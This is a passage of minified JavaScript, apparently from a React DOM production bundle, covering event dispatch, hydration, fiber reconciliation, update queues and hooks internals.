G(F,Q,null,i,V),z.push({event:F,listeners:X}))}}if((t&7)===0){e:{if(F=e==="mouseover"||e==="pointerover",G=e==="mouseout"||e==="pointerout",F&&i!==Rs&&(Q=i.relatedTarget||i.fromElement)&&(Mn(Q)||Q[Ut]))break e;if((G||F)&&(F=V.window===V?V:(F=V.ownerDocument)?F.defaultView||F.parentWindow:window,G?(Q=i.relatedTarget||i.toElement,G=R,Q=Q?Mn(Q):null,Q!==null&&(Fe=Dn(Q),Q!==Fe||Q.tag!==5&&Q.tag!==6)&&(Q=null)):(G=null,Q=R),G!==Q)){if(X=bu,_="onMouseLeave",E="onMouseEnter",C="mouse",(e==="pointerout"||e==="pointerover")&&(X=ku,_="onPointerLeave",E="onPointerEnter",C="pointer"),Fe=G==null?F:dr(G),D=Q==null?F:dr(Q),F=new X(_,C+"leave",G,i,V),F.target=Fe,F.relatedTarget=D,_=null,Mn(V)===R&&(X=new X(E,C+"enter",Q,i,V),X.target=D,X.relatedTarget=Fe,_=X),Fe=_,G&&Q)t:{for(X=G,E=Q,C=0,D=X;D;D=cr(D))C++;for(D=0,_=E;_;_=cr(_))D++;for(;0<C-D;)X=cr(X),C--;for(;0<D-C;)E=cr(E),D--;for(;C--;){if(X===E||E!==null&&X===E.alternate)break t;X=cr(X),E=cr(E)}X=null}else X=null;G!==null&&qu(z,F,G,X,!1),Q!==null&&Fe!==null&&qu(z,Fe,Q,X,!0)}}e:{if(F=R?dr(R):window,G=F.nodeName&&F.nodeName.toLowerCase(),G==="select"||G==="input"&&F.type==="file")var te=by;else if(Pu(F))if(Iu)te=Sy;else{te=ky;var re=wy}else(G=F.nodeName)&&G.toLowerCase()==="input"&&(F.type==="checkbox"||F.type==="radio")&&(te=xy);if(te&&(te=te(e,R))){Eu(z,te,i,V);break e}re&&re(e,F,R),e==="focusout"&&(re=F._wrapperState)&&re.controlled&&F.type==="number"&&Ps(F,"number",F.value)}switch(re=R?dr(R):window,e){case"focusin":(Pu(re)||re.contentEditable==="true")&&(ar=re,na=R,Xr=null);break;case"focusout":Xr=na=ar=null;break;case"mousedown":ra=!0;break;case"contextmenu":case"mouseup":case"dragend":ra=!1,Fu(z,i,V);break;case"selectionchange":if(Ay)break;case"keydown":case"keyup":Fu(z,i,V)}var ie;if(Zs)e:{switch(e){case"compositionstart":var se="onCompositionStart";break e;case"compositionend":se="onCompositionEnd";break e;case"compositionupdate":se="onCompositionUpdate";break e}se=void 0}else sr?Cu(e,i)&&(se="onCompositionEnd"):e==="keydown"&&i.keyCode===229&&(se="onCompositionStart");se&&(xu&&i.locale!=="ko"&&(sr||se!=="onCompositionStart"?se==="onCompositionEnd"&&sr&&(ie=yu()):(an=V,$s="value"in an?an.value:an.textContent,sr=!0)),re=io(R,se),0<re.length&&(se=new wu(se,e,null,i,V),z.push({event:se,listeners:re}),ie?se.data=ie:(ie=Au(i),ie!==null&&(se.data=ie)))),(ie=fy?gy(e,i):my(e,i))&&(R=io(R,"onBeforeInput"),0<R.length&&(V=new wu("onBeforeInput","beforeinput",null,i,V),z.push({event:V,listeners:R}),V.data=ie))}$u(z,t)})}function ei(e,t,i){return{instance:e,listener:t,currentTarget:i}}function io(e,t){for(var i=t+"Capture",s=[];e!==null;){var l=e,u=l.stateNode;l.tag===5&&u!==null&&(l=u,u=jr(e,i),u!=null&&s.unshift(ei(e,u,l)),u=jr(e,t),u!=null&&s.push(ei(e,u,l))),e=e.return}return s}function cr(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function qu(e,t,i,s,l){for(var u=t._reactName,m=[];i!==null&&i!==s;){var b=i,k=b.alternate,R=b.stateNode;if(k!==null&&k===s)break;b.tag===5&&R!==null&&(b=R,l?(k=jr(i,u),k!=null&&m.unshift(ei(i,k,b))):l||(k=jr(i,u),k!=null&&m.push(ei(i,k,b)))),i=i.return}m.length!==0&&e.push({event:t,listeners:m})}var Dy=/\r\n?/g,My=/\u0000|\uFFFD/g;function Yu(e){return(typeof e=="string"?e:""+e).replace(Dy,`
`).replace(My,"")}function oo(e,t,i){if(t=Yu(t),Yu(e)!==t&&i)throw Error(o(425))}function so(){}var ca=null,ua=null;function da(e,t){return e==="textarea"||e==="noscript"||typeof t.children=="string"||typeof t.children=="number"||typeof t.dangerouslySetInnerHTML=="object"&&t.dangerouslySetInnerHTML!==null&&t.dangerouslySetInnerHTML.__html!=null}var pa=typeof setTimeout=="function"?setTimeout:void 0,Ry=typeof clearTimeout=="function"?clearTimeout:void 0,Qu=typeof Promise=="function"?Promise:void 0,Ny=typeof queueMicrotask=="function"?queueMicrotask:typeof Qu<"u"?function(e){return Qu.resolve(null).then(e).catch(Ly)}:pa;function Ly(e){setTimeout(function(){throw e})}function ha(e,t){var i=t,s=0;do{var l=i.nextSibling;if(e.removeChild(i),l&&l.nodeType===8)if(i=l.data,i==="/$"){if(s===0){e.removeChild(l),Hr(t);return}s--}else i!=="$"&&i!=="$?"&&i!=="$!"||s++;i=l}while(i);Hr(t)}function cn(e){for(;e!=null;e=e.nextSibling){var t=e.nodeType;if(t===1||t===3)break;if(t===8){if(t=e.data,t==="$"||t==="$!"||t==="$?")break;if(t==="/$")return null}}return e}function Xu(e){e=e.previousSibling;for(var t=0;e;){if(e.nodeType===8){var i=e.data;if(i==="$"||i==="$!"||i==="$?"){if(t===0)return e;t--}else i==="/$"&&t++}e=e.previousSibling}return null}var ur=Math.random().toString(36).slice(2),Ft="__reactFiber$"+ur,ti="__reactProps$"+ur,Ut="__reactContainer$"+ur,fa="__reactEvents$"+ur,jy="__reactListeners$"+ur,By="__reactHandles$"+ur;function Mn(e){var t=e[Ft];if(t)return t;for(var i=e.parentNode;i;){if(t=i[Ut]||i[Ft]){if(i=t.alternate,t.child!==null||i!==null&&i.child!==null)for(e=Xu(e);e!==null;){if(i=e[Ft])return i;e=Xu(e)}return t}e=i,i=e.parentNode}return null}function ni(e){return e=e[Ft]||e[Ut],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function dr(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(o(33))}function ao(e){return e[ti]||null}var ga=[],pr=-1;function un(e){return{current:e}}function Ee(e){0>pr||(e.current=ga[pr],ga[pr]=null,pr--)}function Ce(e,t){pr++,ga[pr]=e.current,e.current=t}var dn={},Qe=un(dn),ot=un(!1),Rn=dn;function hr(e,t){var i=e.type.contextTypes;if(!i)return dn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===t)return s.__reactInternalMemoizedMaskedChildContext;var l={},u;for(u in i)l[u]=t[u];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=t,e.__reactInternalMemoizedMaskedChildContext=l),l}function st(e){return e=e.childContextTypes,e!=null}function lo(){Ee(ot),Ee(Qe)}function Zu(e,t,i){if(Qe.current!==dn)throw Error(o(168));Ce(Qe,t),Ce(ot,i)}function Ju(e,t,i){var s=e.stateNode;if(t=t.childContextTypes,typeof s.getChildContext!="function")return i;s=s.getChildContext();for(var l in s)if(!(l in t))throw Error(o(108,ke(e)||"Unknown",l));return U({},i,s)}function co(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||dn,Rn=Qe.current,Ce(Qe,e),Ce(ot,ot.current),!0}function ed(e,t,i){var s=e.stateNode;if(!s)throw Error(o(169));i?(e=Ju(e,t,Rn),s.__reactInternalMemoizedMergedChildContext=e,Ee(ot),Ee(Qe),Ce(Qe,e)):Ee(ot),Ce(ot,i)}var Ht=null,uo=!1,ma=!1;function td(e){Ht===null?Ht=[e]:Ht.push(e)}function Fy(e){uo=!0,td(e)}function pn(){if(!ma&&Ht!==null){ma=!0;var e=0,t=xe;try{var i=Ht;for(xe=1;e<i.length;e++){var s=i[e];do s=s(!0);while(s!==null)}Ht=null,uo=!1}catch(l){throw Ht!==null&&(Ht=Ht.slice(e+1)),ru(Vs,pn),l}finally{xe=t,ma=!1}}return null}var fr=[],gr=0,po=null,ho=0,wt=[],kt=0,Nn=null,Gt=1,$t="";function Ln(e,t){fr[gr++]=ho,fr[gr++]=po,po=e,ho=t}function nd(e,t,i){wt[kt++]=Gt,wt[kt++]=$t,wt[kt++]=Nn,Nn=e;var s=Gt;e=$t;var l=32-Et(s)-1;s&=~(1<<l),i+=1;var u=32-Et(t)+l;if(30<u){var m=l-l%5;u=(s&(1<<m)-1).toString(32),s>>=m,l-=m,Gt=1<<32-Et(t)+l|i<<l|s,$t=u+e}else Gt=1<<u|i<<l|s,$t=e}function ya(e){e.return!==null&&(Ln(e,1),nd(e,1,0))}function va(e){for(;e===po;)po=fr[--gr],fr[gr]=null,ho=fr[--gr],fr[gr]=null;for(;e===Nn;)Nn=wt[--kt],wt[kt]=null,$t=wt[--kt],wt[kt]=null,Gt=wt[--kt],wt[kt]=null}var ht=null,ft=null,Me=!1,Dt=null;function rd(e,t){var i=Ct(5,null,null,0);i.elementType="DELETED",i.stateNode=t,i.return=e,t=e.deletions,t===null?(e.deletions=[i],e.flags|=16):t.push(i)}function id(e,t){switch(e.tag){case 5:var i=e.type;return t=t.nodeType!==1||i.toLowerCase()!==t.nodeName.toLowerCase()?null:t,t!==null?(e.stateNode=t,ht=e,ft=cn(t.firstChild),!0):!1;case 6:return t=e.pendingProps===""||t.nodeType!==3?null:t,t!==null?(e.stateNode=t,ht=e,ft=null,!0):!1;case 13:return t=t.nodeType!==8?null:t,t!==null?(i=Nn!==null?{id:Gt,overflow:$t}:null,e.memoizedState={dehydrated:t,treeContext:i,retryLane:1073741824},i=Ct(18,null,null,0),i.stateNode=t,i.return=e,e.child=i,ht=e,ft=null,!0):!1;default:return!1}}function ba(e){return(e.mode&1)!==0&&(e.flags&128)===0}function wa(e){if(Me){var t=ft;if(t){var i=t;if(!id(e,t)){if(ba(e))throw Error(o(418));t=cn(i.nextSibling);var s=ht;t&&id(e,t)?rd(s,i):(e.flags=e.flags&-4097|2,Me=!1,ht=e)}}else{if(ba(e))throw Error(o(418));e.flags=e.flags&-4097|2,Me=!1,ht=e}}}function od(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ht=e}function fo(e){if(e!==ht)return!1;if(!Me)return od(e),Me=!0,!1;var t;if((t=e.tag!==3)&&!(t=e.tag!==5)&&(t=e.type,t=t!=="head"&&t!=="body"&&!da(e.type,e.memoizedProps)),t&&(t=ft)){if(ba(e))throw sd(),Error(o(418));for(;t;)rd(e,t),t=cn(t.nextSibling)}if(od(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(o(317));e:{for(e=e.nextSibling,t=0;e;){if(e.nodeType===8){var i=e.data;if(i==="/$"){if(t===0){ft=cn(e.nextSibling);break e}t--}else i!=="$"&&i!=="$!"&&i!=="$?"||t++}e=e.nextSibling}ft=null}}else ft=ht?cn(e.stateNode.nextSibling):null;return!0}function sd(){for(var e=ft;e;)e=cn(e.nextSibling)}function mr(){ft=ht=null,Me=!1}function ka(e){Dt===null?Dt=[e]:Dt.push(e)}var Vy=B.ReactCurrentBatchConfig;function ri(e,t,i){if(e=i.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(i._owner){if(i=i._owner,i){if(i.tag!==1)throw Error(o(309));var s=i.stateNode}if(!s)throw Error(o(147,e));var l=s,u=""+e;return t!==null&&t.ref!==null&&typeof t.ref=="function"&&t.ref._stringRef===u?t.ref:(t=function(m){var b=l.refs;m===null?delete b[u]:b[u]=m},t._stringRef=u,t)}if(typeof e!="string")throw Error(o(284));if(!i._owner)throw Error(o(290,e))}return e}function go(e,t){throw e=Object.prototype.toString.call(t),Error(o(31,e==="[object Object]"?"object with keys {"+Object.keys(t).join(", ")+"}":e))}function ad(e){var t=e._init;return t(e._payload)}function ld(e){function t(E,C){if(e){var D=E.deletions;D===null?(E.deletions=[C],E.flags|=16):D.push(C)}}function i(E,C){if(!e)return null;for(;C!==null;)t(E,C),C=C.sibling;return null}function s(E,C){for(E=new Map;C!==null;)C.key!==null?E.set(C.key,C):E.set(C.index,C),C=C.sibling;return E}function l(E,C){return E=wn(E,C),E.index=0,E.sibling=null,E}function u(E,C,D){return E.index=D,e?(D=E.alternate,D!==null?(D=D.index,D<C?(E.flags|=2,C):D):(E.flags|=2,C)):(E.flags|=1048576,C)}function m(E){return e&&E.alternate===null&&(E.flags|=2),E}function b(E,C,D,_){return C===null||C.tag!==6?(C=pl(D,E.mode,_),C.return=E,C):(C=l(C,D),C.return=E,C)}function k(E,C,D,_){var te=D.type;return te===H?V(E,C,D.props.children,_,D.key):C!==null&&(C.elementType===te||typeof te=="object"&&te!==null&&te.$$typeof===ae&&ad(te)===C.type)?(_=l(C,D.props),_.ref=ri(E,C,D),_.return=E,_):(_=Oo(D.type,D.key,D.props,null,E.mode,_),_.ref=ri(E,C,D),_.return=E,_)}function R(E,C,D,_){return C===null||C.tag!==4||C.stateNode.containerInfo!==D.containerInfo||C.stateNode.implementation!==D.implementation?(C=hl(D,E.mode,_),C.return=E,C):(C=l(C,D.children||[]),C.return=E,C)}function V(E,C,D,_,te){return C===null||C.tag!==7?(C=Wn(D,E.mode,_,te),C.return=E,C):(C=l(C,D),C.return=E,C)}function z(E,C,D){if(typeof C=="string"&&C!==""||typeof C=="number")return C=pl(""+C,E.mode,D),C.return=E,C;if(typeof C=="object"&&C!==null){switch(C.$$typeof){case $:return D=Oo(C.type,C.key,C.props,null,E.mode,D),D.ref=ri(E,null,C),D.return=E,D;case J:return C=hl(C,E.mode,D),C.return=E,C;case ae:var _=C._init;return z(E,_(C._payload),D)}if(Rr(C)||q(C))return C=Wn(C,E.mode,D,null),C.return=E,C;go(E,C)}return null}function F(E,C,D,_){var te=C!==null?C.key:null;if(typeof D=="string"&&D!==""||typeof D=="number")return te!==null?null:b(E,C,""+D,_);if(typeof D=="object"&&D!==null){switch(D.$$typeof){case $:return D.key===te?k(E,C,D,_):null;case J:return D.key===te?R(E,C,D,_):null;case ae:return te=D._init,F(E,C,te(D._payload),_)}if(Rr(D)||q(D))return te!==null?null:V(E,C,D,_,null);go(E,D)}return null}function G(E,C,D,_,te){if(typeof _=="string"&&_!==""||typeof _=="number")return E=E.get(D)||null,b(C,E,""+_,te);if(typeof _=="object"&&_!==null){switch(_.$$typeof){case $:return E=E.get(_.key===null?D:_.key)||null,k(C,E,_,te);case J:return E=E.get(_.key===null?D:_.key)||null,R(C,E,_,te);case ae:var re=_._init;return G(E,C,D,re(_._payload),te)}if(Rr(_)||q(_))return E=E.get(D)||null,V(C,E,_,te,null);go(C,_)}return null}function Q(E,C,D,_){for(var te=null,re=null,ie=C,se=C=0,$e=null;ie!==null&&se<D.length;se++){ie.index>se?($e=ie,ie=null):$e=ie.sibling;var ye=F(E,ie,D[se],_);if(ye===null){ie===null&&(ie=$e);break}e&&ie&&ye.alternate===null&&t(E,ie),C=u(ye,C,se),re===null?te=ye:re.sibling=ye,re=ye,ie=$e}if(se===D.length)return i(E,ie),Me&&Ln(E,se),te;if(ie===null){for(;se<D.length;se++)ie=z(E,D[se],_),ie!==null&&(C=u(ie,C,se),re===null?te=ie:re.sibling=ie,re=ie);return Me&&Ln(E,se),te}for(ie=s(E,ie);se<D.length;se++)$e=G(ie,E,se,D[se],_),$e!==null&&(e&&$e.alternate!==null&&ie.delete($e.key===null?se:$e.key),C=u($e,C,se),re===null?te=$e:re.sibling=$e,re=$e);return e&&ie.forEach(function(kn){return t(E,kn)}),Me&&Ln(E,se),te}function X(E,C,D,_){var te=q(D);if(typeof te!="function")throw Error(o(150));if(D=te.call(D),D==null)throw Error(o(151));for(var re=te=null,ie=C,se=C=0,$e=null,ye=D.next();ie!==null&&!ye.done;se++,ye=D.next()){ie.index>se?($e=ie,ie=null):$e=ie.sibling;var kn=F(E,ie,ye.value,_);if(kn===null){ie===null&&(ie=$e);break}e&&ie&&kn.alternate===null&&t(E,ie),C=u(kn,C,se),re===null?te=kn:re.sibling=kn,re=kn,ie=$e}if(ye.done)return i(E,ie),Me&&Ln(E,se),te;if(ie===null){for(;!ye.done;se++,ye=D.next())ye=z(E,ye.value,_),ye!==null&&(C=u(ye,C,se),re===null?te=ye:re.sibling=ye,re=ye);return Me&&Ln(E,se),te}for(ie=s(E,ie);!ye.done;se++,ye=D.next())ye=G(ie,E,se,ye.value,_),ye!==null&&(e&&ye.alternate!==null&&ie.delete(ye.key===null?se:ye.key),C=u(ye,C,se),re===null?te=ye:re.sibling=ye,re=ye);return e&&ie.forEach(function(yv){return t(E,yv)}),Me&&Ln(E,se),te}function Fe(E,C,D,_){if(typeof D=="object"&&D!==null&&D.type===H&&D.key===null&&(D=D.props.children),typeof D=="object"&&D!==null){switch(D.$$typeof){case $:e:{for(var te=D.key,re=C;re!==null;){if(re.key===te){if(te=D.type,te===H){if(re.tag===7){i(E,re.sibling),C=l(re,D.props.children),C.return=E,E=C;break e}}else if(re.elementType===te||typeof te=="object"&&te!==null&&te.$$typeof===ae&&ad(te)===re.type){i(E,re.sibling),C=l(re,D.props),C.ref=ri(E,re,D),C.return=E,E=C;break e}i(E,re);break}else t(E,re);re=re.sibling}D.type===H?(C=Wn(D.props.children,E.mode,_,D.key),C.return=E,E=C):(_=Oo(D.type,D.key,D.props,null,E.mode,_),_.ref=ri(E,C,D),_.return=E,E=_)}return m(E);case J:e:{for(re=D.key;C!==null;){if(C.key===re)if(C.tag===4&&C.stateNode.containerInfo===D.containerInfo&&C.stateNode.implementation===D.implementation){i(E,C.sibling),C=l(C,D.children||[]),C.return=E,E=C;break e}else{i(E,C);break}else t(E,C);C=C.sibling}C=hl(D,E.mode,_),C.return=E,E=C}return m(E);case ae:return re=D._init,Fe(E,C,re(D._payload),_)}if(Rr(D))return Q(E,C,D,_);if(q(D))return X(E,C,D,_);go(E,D)}return typeof D=="string"&&D!==""||typeof D=="number"?(D=""+D,C!==null&&C.tag===6?(i(E,C.sibling),C=l(C,D),C.return=E,E=C):(i(E,C),C=pl(D,E.mode,_),C.return=E,E=C),m(E)):i(E,C)}return Fe}var yr=ld(!0),cd=ld(!1),mo=un(null),yo=null,vr=null,xa=null;function Sa(){xa=vr=yo=null}function Ta(e){var t=mo.current;Ee(mo),e._currentValue=t}function Ca(e,t,i){for(;e!==null;){var s=e.alternate;if((e.childLanes&t)!==t?(e.childLanes|=t,s!==null&&(s.childLanes|=t)):s!==null&&(s.childLanes&t)!==t&&(s.childLanes|=t),e===i)break;e=e.return}}function br(e,t){yo=e,xa=vr=null,e=e.dependencies,e!==null&&e.firstContext!==null&&((e.lanes&t)!==0&&(at=!0),e.firstContext=null)}function xt(e){var t=e._currentValue;if(xa!==e)if(e={context:e,memoizedValue:t,next:null},vr===null){if(yo===null)throw Error(o(308));vr=e,yo.dependencies={lanes:0,firstContext:e}}else vr=vr.next=e;return t}var jn=null;function Aa(e){jn===null?jn=[e]:jn.push(e)}function ud(e,t,i,s){var l=t.interleaved;return l===null?(i.next=i,Aa(t)):(i.next=l.next,l.next=i),t.interleaved=i,Kt(e,s)}function Kt(e,t){e.lanes|=t;var i=e.alternate;for(i!==null&&(i.lanes|=t),i=e,e=e.return;e!==null;)e.childLanes|=t,i=e.alternate,i!==null&&(i.childLanes|=t),i=e,e=e.return;return i.tag===3?i.stateNode:null}var hn=!1;function Pa(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function dd(e,t){e=e.updateQueue,t.updateQueue===e&&(t.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function qt(e,t){return{eventTime:e,lane:t,tag:0,payload:null,callback:null,next:null}}function fn(e,t,i){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,(me&2)!==0){var l=s.pending;return l===null?t.next=t:(t.next=l.next,l.next=t),s.pending=t,Kt(e,i)}return l=s.interleaved,l===null?(t.next=t,Aa(s)):(t.next=l.next,l.next=t),s.interleaved=t,Kt(e,i)}function vo(e,t,i){if(t=t.updateQueue,t!==null&&(t=t.shared,(i&4194240)!==0)){var s=t.lanes;s&=e.pendingLanes,i|=s,t.lanes=i,_s(e,i)}}function pd(e,t){var i=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,i===s)){var l=null,u=null;if(i=i.firstBaseUpdate,i!==null){do{var m={eventTime:i.eventTime,lane:i.lane,tag:i.tag,payload:i.payload,callback:i.callback,next:null};u===null?l=u=m:u=u.next=m,i=i.next}while(i!==null);u===null?l=u=t:u=u.next=t}else l=u=t;i={baseState:s.baseState,firstBaseUpdate:l,lastBaseUpdate:u,shared:s.shared,effects:s.effects},e.updateQueue=i;return}e=i.lastBaseUpdate,e===null?i.firstBaseUpdate=t:e.next=t,i.lastBaseUpdate=t}function bo(e,t,i,s){var l=e.updateQueue;hn=!1;var u=l.firstBaseUpdate,m=l.lastBaseUpdate,b=l.shared.pending;if(b!==null){l.shared.pending=null;var k=b,R=k.next;k.next=null,m===null?u=R:m.next=R,m=k;var V=e.alternate;V!==null&&(V=V.updateQueue,b=V.lastBaseUpdate,b!==m&&(b===null?V.firstBaseUpdate=R:b.next=R,V.lastBaseUpdate=k))}if(u!==null){var z=l.baseState;m=0,V=R=k=null,b=u;do{var F=b.lane,G=b.eventTime;if((s&F)===F){V!==null&&(V=V.next={eventTime:G,lane:0,tag:b.tag,payload:b.payload,callback:b.callback,next:null});e:{var Q=e,X=b;switch(F=t,G=i,X.tag){case 1:if(Q=X.payload,typeof Q=="function"){z=Q.call(G,z,F);break e}z=Q;break e;case 3:Q.flags=Q.flags&-65537|128;case 0:if(Q=X.payload,F=typeof Q=="function"?Q.call(G,z,F):Q,F==null)break e;z=U({},z,F);break e;case 2:hn=!0}}b.callback!==null&&b.lane!==0&&(e.flags|=64,F=l.effects,F===null?l.effects=[b]:F.push(b))}else G={eventTime:G,lane:F,tag:b.tag,payload:b.payload,callback:b.callback,next:null},V===null?(R=V=G,k=z):V=V.next=G,m|=F;if(b=b.next,b===null){if(b=l.shared.pending,b===null)break;F=b,b=F.next,F.next=null,l.lastBaseUpdate=F,l.shared.pending=null}}while(!0);if(V===null&&(k=z),l.baseState=k,l.firstBaseUpdate=R,l.lastBaseUpdate=V,t=l.shared.interleaved,t!==null){l=t;do m|=l.lane,l=l.next;while(l!==t)}else u===null&&(l.shared.lanes=0);Vn|=m,e.lanes=m,e.memoizedState=z}}function hd(e,t,i){if(e=t.effects,t.effects=null,e!==null)for(t=0;t<e.length;t++){var s=e[t],l=s.callback;if(l!==null){if(s.callback=null,s=i,typeof l!="function")throw Error(o(191,l));l.call(s)}}}var ii={},Vt=un(ii),oi=un(ii),si=un(ii);function Bn(e){if(e===ii)throw Error(o(174));return e}function Ea(e,t){switch(Ce(si,t),Ce(oi,e),Ce(Vt,ii),e=t.nodeType,e){case 9:case 11:t=(t=t.documentElement)?t.namespaceURI:Is(null,"");break;default:e=e===8?t.parentNode:t,t=e.namespaceURI||null,e=e.tagName,t=Is(t,e)}Ee(Vt),Ce(Vt,t)}function wr(){Ee(Vt),Ee(oi),Ee(si)}function fd(e){Bn(si.current);var t=Bn(Vt.current),i=Is(t,e.type);t!==i&&(Ce(oi,e),Ce(Vt,i))}function Ia(e){oi.current===e&&(Ee(Vt),Ee(oi))}var Re=un(0);function wo(e){for(var t=e;t!==null;){if(t.tag===13){var i=t.memoizedState;if(i!==null&&(i=i.dehydrated,i===null||i.data==="$?"||i.data==="$!"))return t}else if(t.tag===19&&t.memoizedProps.revealOrder!==void 0){if((t.flags&128)!==0)return t}else if(t.child!==null){t.child.return=t,t=t.child;continue}if(t===e)break;for(;t.sibling===null;){if(t.return===null||t.return===e)return null;t=t.return}t.sibling.return=t.return,t=t.sibling}return null}var Da=[];function Ma(){for(var e=0;e<Da.length;e++)Da[e]._workInProgressVersionPrimary=null;Da.length=0}var ko=B.ReactCurrentDispatcher,Ra=B.ReactCurrentBatchConfig,Fn=0,Ne=null,_e=null,He=null,xo=!1,ai=!1,li=0,Oy=0;function Xe(){throw Error(o(321))}function Na(e,t){if(t===null)return!1;for(var i=0;i<t.length&&i<e.length;i++)if(!It(e[i],t[i]))return!1;return!0}function La(e,t,i,s,l,u){if(Fn=u,Ne=t,t.memoizedState=null,t.updateQueue=null,t.lanes=0,ko.current=e===null||e.memoizedState===null?Uy:Hy,e=i(s,l),ai){u=0;do{if(ai=!1,li=0,25<=u)throw Error(o(301));u+=1,He=_e=null,t.updateQueue=null,ko.current=Gy,e=i(s,l)}while(ai)}if(ko.current=Co,t=_e!==null&&_e.next!==null,Fn=0,He=_e=Ne=null,xo=!1,t)throw Error(o(300));return e}function ja(){var e=li!==0;return li=0,e}function Ot(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return He===null?Ne.memoizedState=He=e:He=He.next=e,He}function St(){if(_e===null){var e=Ne.alternate;e=e!==null?e.memoizedState:null}else e=_e.next;var t=He===null?Ne.memoizedState:He.next;if(t!==null)He=t,_e=e;else{if(e===null)throw Error(o(310));_e=e,e={memoizedState:_e.memoizedState,baseState:_e.baseState,baseQueue:_e.baseQueue,queue:_e.queue,next:null},He===null?Ne.memoizedState=He=e:He=He.next=e}return He}function ci(e,t){return typeof t=="function"?t(e):t}function Ba(e){var t=St(),i=t.queue;if(i===null)throw Error(o(311));i.lastRenderedReducer=e;var s=_e,l=s.baseQueue,u=i.pending;if(u!==null){if(l!==null){var m=l.next;l.next=u.next,u.next=m}s.baseQueue=l=u,i.pending=null}if(l!==null){u=l.next,s=s.baseState;var b=m=null,k=null,R=u;do{var V=R.lane;if((Fn&V)===V)k!==null&&(k=k.next={lane:0,action:R.action,hasEagerState:R.hasEagerState,eagerState:R.eagerState,next:null}),s=R.hasEagerState?R.eagerState:e(s,R.action);else{var z={lane:V,action:R.action,hasEagerState:R.hasEagerState,eagerState:R.eagerState,next:null};k===null?(b=k=z,m=s):k=k.next=z,Ne.lanes|=V,Vn|=V}R=R.next}while(R!==null&&R!==u);k===null?m=s:k.next=b,It(s,t.memoizedState)||(at=!0),t.memoizedState=s,t.baseState=m,t.baseQueue=k,i.lastRenderedState=s}if(e=i.interleaved,e!==null){l=e;do u=l.lane,Ne.lanes|=u,Vn|=u,l=l.next;while(l!==e)}else l===null&&(i.lanes=0);return[t.memoizedState,i.dispatch]}function Fa(e){var t=St(),i=t.queue;if(i===null)throw Error(o(311));i.lastRenderedReducer=e;var s=i.dispatch,l=i.pending,u=t.memoizedState;if(l!==null){i.pending=null;var m=l=l.next;do u=e(u,m.action),m=m.next;while(m!==l);It(u,t.memoizedState)||(at=!0),t.memoizedState=u,t.baseQueue===null&&(t.baseState=u),i.lastRenderedState=u}return[u,s]}function gd(){}function md(e,t){var i=Ne,s=St(),l=t(),u=!It(s.memoizedState,l);if(u&&(s.memoizedState=l,at=!0),s=s.queue,Va(bd.bind(null,i,s,e),[e]),s.getSnapshot!==t||u||He!==null&&He.memoizedState.tag&1){if(i.flags|=2048,ui(9,vd.bind(null,i,s,l,t),void 0,null),Ge===null)throw Error(o(349));(Fn&30)!==0||yd(i,t,l)}return l}function yd(e,t,i){e.flags|=16384,e={getSnapshot:t,value:i},t=Ne.updateQueue,t===null?(t={lastEffect:null,stores:null},Ne.updateQueue=t,t.stores=[e]):(i=t.stores,i===null?t.stores=[e]:i.push(e))}function vd(e,t,i,s){t.value=i,t.getSnapshot=s,wd(t)&&kd(e)}function bd(e,t,i){return i(function(){wd(t)&&kd(e)})}function wd(e){var t=e.getSnapshot;e=e.value;try{var i=t();return!It(e,i)}catch{return!0}}function kd(e){var t=Kt(e,1);t!==null&&Lt(t,e,1,-1)}function xd(e){var t=Ot();return typeof e=="function"&&(e=e()),t.memoizedState=t.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:ci,lastRenderedState:e},t.queue=e,e=e.dispatch=Wy.bind(null,Ne,e),[t.memoizedState,e]}function ui(e,t,i,s){return e={tag:e,create:t,destroy:i,deps:s,next:null},t=Ne.updateQueue,t===null?(t={lastEffect:null,stores:null},Ne.updateQueue=t,t.lastEffect=e.next=e):(i=t.lastEffect,i===null?t.lastEffect=e.next=e:(s=i.next,i.next=e,e.next=s,t.lastEffect=e)),e}function Sd(){return St().memoizedState}function So(e,t,i,s){var l=Ot();Ne.flags|=e,l.memoizedState=ui(1|t,i,void 0,s===void 0?null:s)}function To(e,t,i,s){var l=St();s=s===void 0?null:s;var u=void 0;if(_e!==null){var m=_e.memoizedState;if(u=m.destroy,s!==null&&Na(s,m.deps)){l.memoizedState=ui(t,i,u,s);return}}Ne.flags|=e,l.memoizedState=ui(1|t,i,u,s)}function Td(e,t){return So(8390656,8,e,t)}function Va(e,t){return To(2048,8,e,t)}function Cd(e,t){return To(4,2,e,t)}function Ad(e,t){return To(4,4,e,t)}function Pd(e,t){if(typeof t=="function")return e=e(),t(e),function(){t(null)};if(t!=null)return e=e(),t.current=e,function(){t.current=null}}function Ed(e,t,i){return i=i!=null?i.concat([e]):null,To(4,4,Pd.bind(null,t,e),i)}function Oa(){}function Id(e,t){var i=St();t=t===void 0?null:t;var s=i.memoizedState;return s!==null&&t!==null&&Na(t,s[1])?s[0]:(i.memoizedState=[e,t],e)}function Dd(e,t){var i=St();t=t===void 0?null:t;var s=i.memoizedState;return s!==null&&t!==null&&Na(t,s[1])?s[0]:(e=e(),i.memoizedState=[e,t],e)}function Md(e,t,i){return(Fn&21)===0?(e.baseState&&(e.baseState=!1,at=!0),e.memoizedState=i):(It(i,t)||(i=au(),Ne.lanes|=i,Vn|=i,e.baseState=!0),t)}function zy(e,t){var i=xe;xe=i!==0&&4>i?i:4,e(!0);var 